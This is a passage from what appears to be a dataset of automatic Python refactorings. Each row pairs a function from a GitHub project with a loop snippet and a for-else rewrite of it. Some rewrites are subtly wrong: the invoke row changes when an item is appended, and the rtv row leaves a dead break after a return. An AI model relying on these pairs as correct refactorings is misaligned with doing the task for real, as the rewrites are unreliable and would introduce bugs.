    d = join(out_dir, 'fold%d' % fld)
    if not isdir(d):
        d = join(out_dir, 'fold_%d' % fld)
        if not isdir(d):
            ok = False
            break
    validation_folder = join(d, v)
    if not isfile(join(validation_folder, 'summary.json')):
        print('summary.json missing for net %s task %s fold %d' % (model, task_name, fld))
        ok = False
        break
    metrics_tmp = load_json(join(validation_folder, 'summary.json'))['results']['mean']
    for l in metrics_tmp.keys():
        if metrics.get(l) is None:
            metrics[l] = OrderedDict()
        for m in metrics_tmp[l].keys():
            if metrics[l].get(m) is None:
                metrics[l][m] = []
            metrics[l][m].append(metrics_tmp[l][m])
if ok:
    for l in metrics.keys():
        for m in metrics[l].keys():
            assert len(metrics[l][m]) == len(folds)
            metrics[l][m] = np.mean(metrics[l][m])
    json_out = OrderedDict()
    json_out['results'] = OrderedDict()
    json_out['results']['mean'] = metrics
    json_out['task'] = task_name
    json_out['description'] = model + ' ' + task_name + ' all folds summary'
    json_out['name'] = model + ' ' + task_name + ' all folds summary'
    json_out['experiment_name'] = model
    save_json(json_out, join(out_dir, 'summary_allFolds__%s.json' % v))
    save_json(json_out, join(output_dir, '%s__%s__%s__%s.json' % (task_name, model, trainer, v)))
    foreground_mean(join(out_dir, 'summary_allFolds__%s.json' % v))
    foreground_mean(join(output_dir, '%s__%s__%s__%s.json' % (task_name, model, trainer, v)))","for fld in folds:
    d = join(out_dir, 'fold%d' % fld)
    if not isdir(d):
        d = join(out_dir, 'fold_%d' % fld)
        if not isdir(d):
            break
    validation_folder = join(d, v)
    if not isfile(join(validation_folder, 'summary.json')):
        print('summary.json missing for net %s task %s fold %d' % (model, task_name, fld))
        break
    metrics_tmp = load_json(join(validation_folder, 'summary.json'))['results']['mean']
    for l in metrics_tmp.keys():
        if metrics.get(l) is None:
            metrics[l] = OrderedDict()
        for m in metrics_tmp[l].keys():
            if metrics[l].get(m) is None:
                metrics[l][m] = []
            metrics[l][m].append(metrics_tmp[l][m])
else:
    for l in metrics.keys():
        for m in metrics[l].keys():
            assert len(metrics[l][m]) == len(folds)
            metrics[l][m] = np.mean(metrics[l][m])
    json_out = OrderedDict()
    json_out['results'] = OrderedDict()
    json_out['results']['mean'] = metrics
    json_out['task'] = task_name
    json_out['description'] = model + ' ' + task_name + ' all folds summary'
    json_out['name'] = model + ' ' + task_name + ' all folds summary'
    json_out['experiment_name'] = model
    save_json(json_out, join(out_dir, 'summary_allFolds__%s.json' % v))
    save_json(json_out, join(output_dir, '%s__%s__%s__%s.json' % (task_name, model, trainer, v)))
    foreground_mean(join(out_dir, 'summary_allFolds__%s.json' % v))
    foreground_mean(join(output_dir, '%s__%s__%s__%s.json' % (task_name, model, trainer, v)))",0
evillimiter,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/evillimiter/evillimiter/menus/parser.py,https://github.com/bitbrute/evillimiter/tree/master/evillimiter/menus/parser.py,CommandParser,parse$83,"def parse(self, command):
        """"""
        Parses a given list of arguments
        """"""
        names = [x.name for x in (self._flag_commands + self._parameter_commands)]
        result_dict = dict.fromkeys(names, None)

        # indicates whether or not to skip the next command argument
        skip_next = False

        for i, arg in enumerate(command):
            if skip_next:
                skip_next = False
                continue

            if i == 0:
                # check if the first argument is a subparser
                for sp in self._subparsers:
                    if sp.identifier == arg:
                        # if subparser present, parse arguments there
                        result = sp.subparser.parse(command[(i + 1):])
                        if result is not None and sp.handler is not None:
                            # call the subparser's handler if available
                            sp.handler(result)

                        return result
            
            # indicates whether or not the argument has been processed
            is_arg_processed = False

            for cmd in self._flag_commands:
                if cmd.identifier == arg:
                    if cmd.type == CommandParser.CommandType.FLAG_COMMAND:
                        # if its a flag, set the flag to true
                        result_dict[cmd.name] = True
                        is_arg_processed = True
                        break
                    elif cmd.type == CommandParser.CommandType.PARAMETERIZED_FLAG_COMMAND:
                        if (len(command) - 1) < (i + 1):
                            # no more command arguments to process
                            IO.error('parameter for flag {}{}{} is missing'.format(IO.Fore.LIGHTYELLOW_EX, cmd.name, IO.Style.RESET_ALL))
                            return

                        # if parameterized flag, set value to next argument
                        value = command[i + 1]
                        result_dict[cmd.name] = value

                        # skip the next argument (already processed)
                        skip_next = True

                        is_arg_processed = True
                        break
            
            if not is_arg_processed:
                for cmd in self._parameter_commands:
                    # parameter command, since a flag could not be found
                    if result_dict[cmd.name] is None:
                        # set parameter value
                        result_dict[cmd.name] = arg
                        is_arg_processed = True
                        break

            if not is_arg_processed:
                IO.error('{}{}{} is an unknown command.'.format(IO.Fore.LIGHTYELLOW_EX, arg, IO.Style.RESET_ALL))
                return

        # check if there are any parameters missing
        for cmd in self._parameter_commands:
            if result_dict[cmd.name] is None:
                IO.error('parameter {}{}{} is missing'.format(IO.Fore.LIGHTYELLOW_EX, cmd.name, IO.Style.RESET_ALL))
                return

        # set unspecified flags to False instead of None
        for cmd in self._flag_commands:
            if cmd.type == CommandParser.CommandType.FLAG_COMMAND:
                if result_dict[cmd.name] is None:
                    result_dict[cmd.name] = False

        result_tuple = collections.namedtuple('ParseResult', sorted(result_dict))
        return result_tuple(**result_dict)","for cmd in self._flag_commands:
    if cmd.identifier == arg:
        if cmd.type == CommandParser.CommandType.FLAG_COMMAND:
            result_dict[cmd.name] = True
            is_arg_processed = True
            break
        elif cmd.type == CommandParser.CommandType.PARAMETERIZED_FLAG_COMMAND:
            if len(command) - 1 < i + 1:
                IO.error('parameter for flag {}{}{} is missing'.format(IO.Fore.LIGHTYELLOW_EX, cmd.name, IO.Style.RESET_ALL))
                return
            value = command[i + 1]
            result_dict[cmd.name] = value
            skip_next = True
            is_arg_processed = True
            break
if not is_arg_processed:
    for cmd in self._parameter_commands:
        if result_dict[cmd.name] is None:
            result_dict[cmd.name] = arg
            is_arg_processed = True
            break","for cmd in self._flag_commands:
    if cmd.identifier == arg:
        if cmd.type == CommandParser.CommandType.FLAG_COMMAND:
            result_dict[cmd.name] = True
            is_arg_processed = True
            break
        elif cmd.type == CommandParser.CommandType.PARAMETERIZED_FLAG_COMMAND:
            if len(command) - 1 < i + 1:
                IO.error('parameter for flag {}{}{} is missing'.format(IO.Fore.LIGHTYELLOW_EX, cmd.name, IO.Style.RESET_ALL))
                return
            value = command[i + 1]
            result_dict[cmd.name] = value
            skip_next = True
            is_arg_processed = True
            break
else:
    for cmd in self._parameter_commands:
        if result_dict[cmd.name] is None:
            result_dict[cmd.name] = arg
            is_arg_processed = True
            break",0
alfred-workflow,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/alfred-workflow/workflow/update.py,https://github.com/deanishe/alfred-workflow/tree/master/workflow/update.py,Download,from_releases$78,"def from_releases(cls, js):
        """"""Extract downloads from GitHub releases.

        Searches releases with semantic tags for assets with
        file extension .alfredworkflow or .alfredXworkflow where
        X is a number.

        Files are returned sorted by latest version first. Any
        releases containing multiple files with the same (workflow)
        extension are rejected as ambiguous.

        Args:
            js (str): JSON response from GitHub's releases endpoint.

        Returns:
            list: Sequence of `Download`.
        """"""
        releases = json.loads(js)
        downloads = []
        for release in releases:
            tag = release['tag_name']
            dupes = defaultdict(int)
            try:
                version = Version(tag)
            except ValueError as err:
                wf().logger.debug('ignored release: bad version ""%s"": %s',
                                  tag, err)
                continue

            dls = []
            for asset in release.get('assets', []):
                url = asset.get('browser_download_url')
                filename = os.path.basename(url)
                m = match_workflow(filename)
                if not m:
                    wf().logger.debug('unwanted file: %s', filename)
                    continue

                ext = m.group(0)
                dupes[ext] = dupes[ext] + 1
                dls.append(Download(url, filename, version,
                                    release['prerelease']))

            valid = True
            for ext, n in dupes.items():
                if n > 1:
                    wf().logger.debug('ignored release ""%s"": multiple assets '
                                      'with extension ""%s""', tag, ext)
                    valid = False
                    break

            if valid:
                downloads.extend(dls)

        downloads.sort(reverse=True)
        return downloads","for (ext, n) in dupes.items():
    if n > 1:
        wf().logger.debug('ignored release ""%s"": multiple assets with extension ""%s""', tag, ext)
        valid = False
        break
if valid:
    downloads.extend(dls)","for (ext, n) in dupes.items():
    if n > 1:
        wf().logger.debug('ignored release ""%s"": multiple assets with extension ""%s""', tag, ext)
        break
else:
    downloads.extend(dls)",0
Paddle,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Paddle/python/paddle/distributed/auto_parallel/utils.py,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/distributed/auto_parallel/utils.py,,_merge_parameter$997,"def _merge_parameter(
    partition_param_list, param, partition_index, complete_shape
):
    """"""
    Merge partitial parameters to a complete one.

    Returns:
        None

    Examples:
        .. code-block:: python

            import numpy as np
            partition_param_list = [(np.array([[[1.11, 1.12]]]), [[0,1],[0,1],[0,2]])]
            param = np.array([[[1.13, 1.14]]])
            partition_index = [[0,1],[0,1],[2,4]]

            _merge_parameter(partition_param_list, param, partition_index)
            # partition_param_list: [(np.array([[[1.11, 1.12, 1.13, 1.14]]]), [[0,1],[0,1],[0,4]])]
    """"""
    from .reshard import Resharder

    if len(partition_param_list) == 1:
        is_complete_data = True
        for idx, item in enumerate(partition_param_list[0][1]):
            if item[0] != 0 or item[1] != complete_shape[idx]:
                is_complete_data = False
                break
        if is_complete_data:
            return

    if not partition_param_list:
        partition_param_list.append((param, partition_index))
    else:
        i = 0
        while i < len(partition_param_list):
            (
                concat_axis,
                first_order,
                new_partition,
            ) = Resharder.compute_concat_info(
                partition_param_list[i][1], partition_index
            )
            if concat_axis != -1:
                if first_order == 0:
                    new_param = np.concatenate(
                        (partition_param_list[i][0], param), axis=concat_axis
                    )
                else:
                    new_param = np.concatenate(
                        (param, partition_param_list[i][0]), axis=concat_axis
                    )

                partition_param_list.pop(i)
                _merge_parameter(
                    partition_param_list,
                    new_param,
                    new_partition,
                    complete_shape,
                )
                break
            i += 1","for (idx, item) in enumerate(partition_param_list[0][1]):
    if item[0] != 0 or item[1] != complete_shape[idx]:
        is_complete_data = False
        break
if is_complete_data:
    return","for (idx, item) in enumerate(partition_param_list[0][1]):
    if item[0] != 0 or item[1] != complete_shape[idx]:
        break
else:
    return",0
netzob,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/netzob/netzob/src/netzob/Inference/Vocabulary/RelationFinder.py,https://github.com/netzob/netzob/tree/master/netzob/src/netzob/Inference/Vocabulary/RelationFinder.py,RelationFinder,executeOnSymbol$159,"def executeOnSymbol(self, symbol):
        """"""Find exact relations between fields of the provided symbol.
        """"""

        (attributeValues_headers,
         attributeValues) = self._generateAttributeValuesForSymbol(symbol)
        results = []

        for i, x_values in enumerate(attributeValues[:-1]):
            for j, y_values in enumerate(attributeValues[:]):
                if j <= i:
                    continue
                isRelation = True
                for k in range(len(x_values)):
                    if not (x_values[k] == y_values[k]):
                        isRelation = False
                        break
                if isRelation:
                    # Do no keep relations where a field's values does not change
                    if len(set(x_values)) == 1 or len(set(y_values)) == 1:
                        continue
                    (x_fields, x_attribute) = attributeValues_headers[i]
                    (y_fields, y_attribute) = attributeValues_headers[j]
                    # The relation should not apply on the same field
                    if len(x_fields) == 1 and len(y_fields) == 1 and x_fields[
                            0].id == y_fields[0].id:
                        continue
                    relation_type = self._findRelationType(x_attribute,
                                                           y_attribute,x_fields,y_fields)
                    # We do not consider unqualified relation (for example, the size of a field is linked to the size of another field)
                    if relation_type == self.REL_UNKNOWN:
                        continue
                    # DataRelation should produce an empty intersection between related fields
                    if relation_type == self.REL_DATA and len(
                            set(x_fields).intersection(set(y_fields))) > 0:
                        continue
                    # SizeRelation should a size field composed of multiple fields
                    if relation_type == self.REL_SIZE:
                        if x_attribute == self.ATTR_VALUE:
                            if len(x_fields) > 1:
                                continue
                        elif y_attribute == self.ATTR_VALUE:
                            if len(y_fields) > 1:
                                continue
                    # EqualityRelation should a field be equal to another field composed of multiple fields
                    if relation_type == self.REL_EQUALITY:
                        if x_attribute == self.ATTR_VALUE:
                            if len(x_fields) > 1:
                                continue
                        elif y_attribute == self.ATTR_VALUE:
                            if len(y_fields) > 1:
                                continue
                    self._logger.debug(""Relation found between '"" + str(
                        x_fields) + "":"" + x_attribute + ""' and '"" + str(
                            y_fields) + "":"" + y_attribute + ""'"")
                    id_relation = str(uuid.uuid4())
                    results.append({
                        'id': id_relation,
                        ""relation_type"": relation_type,
                        'x_fields': x_fields,
                        'x_attribute': x_attribute,
                        'y_fields': y_fields,
                        'y_attribute': y_attribute
                    })
        return results","for k in range(len(x_values)):
    if not x_values[k] == y_values[k]:
        isRelation = False
        break
if isRelation:
    if len(set(x_values)) == 1 or len(set(y_values)) == 1:
        continue
    (x_fields, x_attribute) = attributeValues_headers[i]
    (y_fields, y_attribute) = attributeValues_headers[j]
    if len(x_fields) == 1 and len(y_fields) == 1 and (x_fields[0].id == y_fields[0].id):
        continue
    relation_type = self._findRelationType(x_attribute, y_attribute, x_fields, y_fields)
    if relation_type == self.REL_UNKNOWN:
        continue
    if relation_type == self.REL_DATA and len(set(x_fields).intersection(set(y_fields))) > 0:
        continue
    if relation_type == self.REL_SIZE:
        if x_attribute == self.ATTR_VALUE:
            if len(x_fields) > 1:
                continue
        elif y_attribute == self.ATTR_VALUE:
            if len(y_fields) > 1:
                continue
    if relation_type == self.REL_EQUALITY:
        if x_attribute == self.ATTR_VALUE:
            if len(x_fields) > 1:
                continue
        elif y_attribute == self.ATTR_VALUE:
            if len(y_fields) > 1:
                continue
    self._logger.debug(""Relation found between '"" + str(x_fields) + ':' + x_attribute + ""' and '"" + str(y_fields) + ':' + y_attribute + ""'"")
    id_relation = str(uuid.uuid4())
    results.append({'id': id_relation, 'relation_type': relation_type, 'x_fields': x_fields, 'x_attribute': x_attribute, 'y_fields': y_fields, 'y_attribute': y_attribute})","for k in range(len(x_values)):
    if not x_values[k] == y_values[k]:
        break
else:
    if len(set(x_values)) == 1 or len(set(y_values)) == 1:
        continue
    (x_fields, x_attribute) = attributeValues_headers[i]
    (y_fields, y_attribute) = attributeValues_headers[j]
    if len(x_fields) == 1 and len(y_fields) == 1 and (x_fields[0].id == y_fields[0].id):
        continue
    relation_type = self._findRelationType(x_attribute, y_attribute, x_fields, y_fields)
    if relation_type == self.REL_UNKNOWN:
        continue
    if relation_type == self.REL_DATA and len(set(x_fields).intersection(set(y_fields))) > 0:
        continue
    if relation_type == self.REL_SIZE:
        if x_attribute == self.ATTR_VALUE:
            if len(x_fields) > 1:
                continue
        elif y_attribute == self.ATTR_VALUE:
            if len(y_fields) > 1:
                continue
    if relation_type == self.REL_EQUALITY:
        if x_attribute == self.ATTR_VALUE:
            if len(x_fields) > 1:
                continue
        elif y_attribute == self.ATTR_VALUE:
            if len(y_fields) > 1:
                continue
    self._logger.debug(""Relation found between '"" + str(x_fields) + ':' + x_attribute + ""' and '"" + str(y_fields) + ':' + y_attribute + ""'"")
    id_relation = str(uuid.uuid4())
    results.append({'id': id_relation, 'relation_type': relation_type, 'x_fields': x_fields, 'x_attribute': x_attribute, 'y_fields': y_fields, 'y_attribute': y_attribute})",0
hummingbot,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/hummingbot/test/debug/test_paper_trade_market.py,https://github.com/CoinAlpha/hummingbot/tree/master/test/debug/test_paper_trade_market.py,TestUtils,get_match_limit_orders$65,"def get_match_limit_orders(cls, limit_orders: List[LimitOrder], match_dict: Dict[str, any]):
        match_orders = []
        for o in limit_orders:
            match = True
            for k, v in match_dict.items():
                try:
                    order_value = getattr(o, k)
                    if type(v) in [float]:
                        if abs(v - float(order_value)) <= 1 * 10 ** (-8):
                            continue
                    elif order_value != v:
                        match = False
                        break
                except Exception as err:
                    print(f""Key {k} does not exist in LimitOrder {o}. Error: {err}"")
            if match:
                match_orders.append(o)
        return match_orders","for (k, v) in match_dict.items():
    try:
        order_value = getattr(o, k)
        if type(v) in [float]:
            if abs(v - float(order_value)) <= 1 * 10 ** (-8):
                continue
        elif order_value != v:
            match = False
            break
    except Exception as err:
        print(f'Key {k} does not exist in LimitOrder {o}. Error: {err}')
if match:
    match_orders.append(o)","for (k, v) in match_dict.items():
    try:
        order_value = getattr(o, k)
        if type(v) in [float]:
            if abs(v - float(order_value)) <= 1 * 10 ** (-8):
                continue
        elif order_value != v:
            break
    except Exception as err:
        print(f'Key {k} does not exist in LimitOrder {o}. Error: {err}')
else:
    match_orders.append(o)",0
AzurLaneAutoScript,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/AzurLaneAutoScript/module/ocr/al_ocr.py,https://github.com/LmeSzinc/AzurLaneAutoScript/tree/master/module/ocr/al_ocr.py,AlOcr,_assert_and_prepare_model_files$114,"def _assert_and_prepare_model_files(self):
        model_dir = self._model_dir
        model_files = [
            'label_cn.txt',
            '%s-%04d.params' % (self._model_file_prefix, self._model_epoch),
            '%s-symbol.json' % self._model_file_prefix,
        ]
        file_prepared = True
        for f in model_files:
            f = os.path.join(model_dir, f)
            if not os.path.exists(f):
                file_prepared = False
                logger.warning('can not find file %s', f)
                break

        if file_prepared:
            return

        # Disable auto downloading cnocr models when model not found.
        # get_model_file(model_dir)
        logger.warning(f'Ocr model not prepared: {model_dir}')
        logger.warning(f'Required files: {model_files}')
        logger.critical('Please check if required files of pre-trained OCR model exist')
        raise RequestHumanTakeover","for f in model_files:
    f = os.path.join(model_dir, f)
    if not os.path.exists(f):
        file_prepared = False
        logger.warning('can not find file %s', f)
        break
if file_prepared:
    return","for f in model_files:
    f = os.path.join(model_dir, f)
    if not os.path.exists(f):
        logger.warning('can not find file %s', f)
        break
else:
    return",0
invoke,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/invoke/invoke/vendor/decorator.py,https://github.com/pyinvoke/invoke/tree/master/invoke/vendor/decorator.py,,append$294,"def append(a, vancestors):
    """"""
    Append ``a`` to the list of the virtual ancestors, unless it is already
    included.
    """"""
    add = True
    for j, va in enumerate(vancestors):
        if issubclass(va, a):
            add = False
            break
        if issubclass(a, va):
            vancestors[j] = a
            add = False
    if add:
        vancestors.append(a)","for (j, va) in enumerate(vancestors):
    if issubclass(va, a):
        add = False
        break
    if issubclass(a, va):
        vancestors[j] = a
        add = False
if add:
    vancestors.append(a)","for (j, va) in enumerate(vancestors):
    if issubclass(va, a):
        add = False
        break
    if issubclass(a, va):
        vancestors[j] = a
        add = False
else:
    vancestors.append(a)",0
Paddle,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Paddle/python/paddle/distributed/auto_parallel/completion.py,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/distributed/auto_parallel/completion.py,Completer,_update_dist_attr_for_dp$1001,"def _update_dist_attr_for_dp(self):
        # TODO: we must ensure the world process group contains all ranks
        ranks = get_world_process_group().ranks
        process_mesh = ProcessMesh(ranks)

        dist_tensors = self._dist_context._dist_tensors_for_program
        for dist_tensor in dist_tensors.values():
            dist_tensor.dist_attr.process_mesh = process_mesh

        dist_ops = self._dist_context._dist_ops_for_program
        for dist_op in dist_ops.values():
            serial_op = dist_op.serial_op
            op_dist_attr = dist_op.dist_attr
            op_dist_attr.process_mesh = process_mesh
            original_op_dist_attr = copy.deepcopy(op_dist_attr)

            for arg_name in serial_op.input_arg_names:
                serial_tensor = dist_op.get_serial_input(arg_name)
                if not serial_tensor.is_parameter:
                    dist_tensor = (
                        self._dist_context.get_dist_tensor_for_program(
                            serial_tensor
                        )
                    )
                    op_dist_attr = dist_op.dist_attr
                    op_dist_attr.process_mesh = (
                        dist_tensor.dist_attr.process_mesh
                    )
                    op_dist_attr.set_input_dims_mapping(
                        arg_name, dist_tensor.dist_attr.dims_mapping
                    )

            op_dist_impls = find_compatible_distributed_operator_impls(
                dist_op, fwd=True
            )
            if op_dist_impls is not None:
                not_compatible = True
                backup_op_dist_attr = copy.deepcopy(op_dist_attr)
                for op_dist_impl in op_dist_impls:
                    op_dist_impl.update_dims_mapping(dist_op)
                    if (
                        op_dist_impl.is_auto_compatible(dist_op)
                        and dist_op.validate_dist_attr()
                    ):
                        op_dist_attr.impl_type = op_dist_impl.type
                        op_dist_attr.impl_idx = op_dist_impl.idx
                        not_compatible = False
                        break
                    else:
                        dist_op.dist_attr = backup_op_dist_attr
                if not_compatible:
                    dist_op.dist_attr = original_op_dist_attr
            else:
                dist_op.dist_attr = original_op_dist_attr

            for arg_name in serial_op.output_arg_names:
                op_dist_attr = dist_op.dist_attr
                serial_tensor = dist_op.get_serial_output(arg_name)
                if serial_op.type in [""fill_constant""]:
                    old_dims_mapping = op_dist_attr.get_output_dims_mapping(
                        arg_name
                    )
                    if len(old_dims_mapping) > 0:
                        new_dims_mapping = [0] + [
                            -1 for _ in range(len(old_dims_mapping) - 1)
                        ]
                        op_dist_attr.set_output_dims_mapping(
                            arg_name, new_dims_mapping
                        )
                dist_tensor = self._dist_context.get_dist_tensor_for_program(
                    serial_tensor
                )
                dist_tensor.dist_attr.dims_mapping = (
                    op_dist_attr.get_output_dims_mapping(arg_name)
                )","for op_dist_impl in op_dist_impls:
    op_dist_impl.update_dims_mapping(dist_op)
    if op_dist_impl.is_auto_compatible(dist_op) and dist_op.validate_dist_attr():
        op_dist_attr.impl_type = op_dist_impl.type
        op_dist_attr.impl_idx = op_dist_impl.idx
        not_compatible = False
        break
    else:
        dist_op.dist_attr = backup_op_dist_attr
if not_compatible:
    dist_op.dist_attr = original_op_dist_attr","for op_dist_impl in op_dist_impls:
    op_dist_impl.update_dims_mapping(dist_op)
    if op_dist_impl.is_auto_compatible(dist_op) and dist_op.validate_dist_attr():
        op_dist_attr.impl_type = op_dist_impl.type
        op_dist_attr.impl_idx = op_dist_impl.idx
        break
    else:
        dist_op.dist_attr = backup_op_dist_attr
else:
    dist_op.dist_attr = original_op_dist_attr",0
ansible-modules-core,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ansible-modules-core/cloud/openstack/os_router.py,https://github.com/ansible/ansible-modules-core/tree/master/cloud/openstack/os_router.py,,_needs_update$182,"def _needs_update(cloud, module, router, network, internal_subnet_ids):
    """"""Decide if the given router needs an update.
    """"""
    if router['admin_state_up'] != module.params['admin_state_up']:
        return True
    if router['external_gateway_info']:
        if router['external_gateway_info'].get('enable_snat', True) != module.params['enable_snat']:
            return True
    if network:
        if not router['external_gateway_info']:
            return True
        elif router['external_gateway_info']['network_id'] != network['id']:
            return True

    # check external interfaces
    if module.params['external_fixed_ips']:
        for new_iface in module.params['external_fixed_ips']:
            subnet = cloud.get_subnet(new_iface['subnet'])
            exists = False

            # compare the requested interface with existing, looking for an existing match
            for existing_iface in router['external_gateway_info']['external_fixed_ips']:
                if existing_iface['subnet_id'] == subnet['id']:
                    if 'ip' in new_iface:
                        if existing_iface['ip_address'] == new_iface['ip']:
                            # both subnet id and ip address match
                            exists = True
                            break
                    else:
                        # only the subnet was given, so ip doesn't matter
                        exists = True
                        break

            # this interface isn't present on the existing router
            if not exists:
                return True

    # check internal interfaces
    if module.params['interfaces']:
        existing_subnet_ids = []
        for port in cloud.list_router_interfaces(router, 'internal'):
            if 'fixed_ips' in port:
                for fixed_ip in port['fixed_ips']:
                    existing_subnet_ids.append(fixed_ip['subnet_id'])

        if set(internal_subnet_ids) != set(existing_subnet_ids):
            return True

    return False","for existing_iface in router['external_gateway_info']['external_fixed_ips']:
    if existing_iface['subnet_id'] == subnet['id']:
        if 'ip' in new_iface:
            if existing_iface['ip_address'] == new_iface['ip']:
                exists = True
                break
        else:
            exists = True
            break
if not exists:
    return True","for existing_iface in router['external_gateway_info']['external_fixed_ips']:
    if existing_iface['subnet_id'] == subnet['id']:
        if 'ip' in new_iface:
            if existing_iface['ip_address'] == new_iface['ip']:
                break
        else:
            break
else:
    return True",0
LightAutoML,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/LightAutoML/lightautoml/pipelines/utils.py,https://github.com/sberbank-ai-lab/LightAutoML/tree/master/lightautoml/pipelines/utils.py,,get_columns_by_role$46,"def get_columns_by_role(dataset: LAMLDataset, role_name: str, **kwargs: Any) -> List[str]:
    """"""Search for columns with specific role and attributes when building pipeline.

    Args:
        dataset: Dataset to search.
        role_name: Name of features role.
        **kwargs: Specific parameters values to search.
            Example: search for categories with OHE processing only.

    Returns:
        List of str features names.

    """"""
    features = []
    inv_roles = dataset.inverse_roles
    for role in inv_roles:
        if role.name == role_name:
            flg = True
            # TODO: maybe refactor
            for k in kwargs:
                try:
                    attr = getattr(role, k)
                except AttributeError:
                    flg = False
                    break
                if attr != kwargs[k]:
                    flg = False
                    break
            if flg:
                features.extend(inv_roles[role])

    return sorted(features)","for k in kwargs:
    try:
        attr = getattr(role, k)
    except AttributeError:
        flg = False
        break
    if attr != kwargs[k]:
        flg = False
        break
if flg:
    features.extend(inv_roles[role])","for k in kwargs:
    try:
        attr = getattr(role, k)
    except AttributeError:
        flg = False
        break
    if attr != kwargs[k]:
        flg = False
        break
else:
    features.extend(inv_roles[role])",0
rtv,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/rtv/rtv/objects.py,https://github.com/michael-lazar/rtv/tree/master/rtv/objects.py,Controller,trigger$586,"def trigger(self, char, *args, **kwargs):

        if isinstance(char, six.string_types) and len(char) == 1:
            char = ord(char)

        func = None
        # Check if the controller (or any of the controller's parents) have
        # registered a function to the given key
        for controller in self.parents:
            func = controller.character_map.get((self.last_char, char))
            if func:
                break
            func = controller.character_map.get(char)
            if func:
                break

        if func:
            self.last_char = None
            return func(self.instance, *args, **kwargs)
        else:
            self.last_char = char
            return None","for controller in self.parents:
    func = controller.character_map.get((self.last_char, char))
    if func:
        break
    func = controller.character_map.get(char)
    if func:
        break
if func:
    self.last_char = None
    return func(self.instance, *args, **kwargs)
else:
    self.last_char = char
    return None","for controller in self.parents:
    func = controller.character_map.get((self.last_char, char))
    if func:
        self.last_char = None
        return func(self.instance, *args, **kwargs)
        break
    func = controller.character_map.get(char)
    if func:
        self.last_char = None
        return func(self.instance, *args, **kwargs)
        break
else:
    self.last_char = char
    return None",0
Plex-Meta-Manager,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Plex-Meta-Manager/modules/sonarr.py,https://github.com/meisnate12/Plex-Meta-Manager/tree/master/modules/sonarr.py,Sonarr,remove_all_with_tags$234,"def remove_all_with_tags(self, tags):
        lower_tags = [_t.lower() for _t in tags]
        remove_items = []
        for series in self.api.all_series():
            tag_strs = [_t.label.lower() for _t in series.tags]
            remove = True
            for tag in lower_tags:
                if tag not in tag_strs:
                    remove = False
                    break
            if remove:
                remove_items.append(series)
        if remove_items:
            self.api.delete_multiple_series(remove_items)","for tag in lower_tags:
    if tag not in tag_strs:
        remove = False
        break
if remove:
    remove_items.append(series)","for tag in lower_tags:
    if tag not in tag_strs:
        break
else:
    remove_items.append(series)",0
rockstor-core,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/rockstor-core/src/rockstor/system/samba.py,https://github.com/rockstor/rockstor-core/tree/master/src/rockstor/system/samba.py,,refresh_smb_config$95,"def refresh_smb_config(exports):
    fh, npath = mkstemp()
    with open(SMB_CONFIG) as sfo, open(npath, ""w"") as tfo:
        rockstor_section = False
        for line in sfo.readlines():
            if re.match(RS_SHARES_HEADER, line) is not None:
                rockstor_section = True
                rockstor_smb_config(tfo, exports)
                break
            else:
                tfo.write(line)
        if rockstor_section is False:
            rockstor_smb_config(tfo, exports)
    test_parm(npath)
    shutil.move(npath, SMB_CONFIG)","for line in sfo.readlines():
    if re.match(RS_SHARES_HEADER, line) is not None:
        rockstor_section = True
        rockstor_smb_config(tfo, exports)
        break
    else:
        tfo.write(line)
if rockstor_section is False:
    rockstor_smb_config(tfo, exports)","for line in sfo.readlines():
    if re.match(RS_SHARES_HEADER, line) is not None:
        rockstor_smb_config(tfo, exports)
        break
    else:
        tfo.write(line)
else:
    rockstor_smb_config(tfo, exports)",0
nltk,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/nltk/nltk/stem/snowball.py,https://github.com/nltk/nltk/tree/master/nltk/stem/snowball.py,RussianStemmer,stem$4882,"def stem(self, word):
        """"""
        Stem a Russian word and return the stemmed form.

        :param word: The word that is stemmed.
        :type word: str or unicode
        :return: The stemmed form.
        :rtype: unicode

        """"""
        if word in self.stopwords:
            return word

        chr_exceeded = False
        for i in range(len(word)):
            if ord(word[i]) > 255:
                chr_exceeded = True
                break

        if not chr_exceeded:
            return word

        word = self.__cyrillic_to_roman(word)

        step1_success = False
        adjectival_removed = False
        verb_removed = False
        undouble_success = False
        superlative_removed = False

        rv, r2 = self.__regions_russian(word)

        # Step 1
        for suffix in self.__perfective_gerund_suffixes:
            if rv.endswith(suffix):
                if suffix in (""v"", ""vshi"", ""vshis'""):
                    if (
                        rv[-len(suffix) - 3 : -len(suffix)] == ""i^a""
                        or rv[-len(suffix) - 1 : -len(suffix)] == ""a""
                    ):
                        word = word[: -len(suffix)]
                        r2 = r2[: -len(suffix)]
                        rv = rv[: -len(suffix)]
                        step1_success = True
                        break
                else:
                    word = word[: -len(suffix)]
                    r2 = r2[: -len(suffix)]
                    rv = rv[: -len(suffix)]
                    step1_success = True
                    break

        if not step1_success:
            for suffix in self.__reflexive_suffixes:
                if rv.endswith(suffix):
                    word = word[: -len(suffix)]
                    r2 = r2[: -len(suffix)]
                    rv = rv[: -len(suffix)]
                    break

            for suffix in self.__adjectival_suffixes:
                if rv.endswith(suffix):
                    if suffix in (
                        ""i^ushchi^ui^u"",
                        ""i^ushchi^ai^a"",
                        ""i^ushchui^u"",
                        ""i^ushchai^a"",
                        ""i^ushchoi^u"",
                        ""i^ushchei^u"",
                        ""i^ushchimi"",
                        ""i^ushchymi"",
                        ""i^ushchego"",
                        ""i^ushchogo"",
                        ""i^ushchemu"",
                        ""i^ushchomu"",
                        ""i^ushchikh"",
                        ""i^ushchykh"",
                        ""shchi^ui^u"",
                        ""shchi^ai^a"",
                        ""i^ushchee"",
                        ""i^ushchie"",
                        ""i^ushchye"",
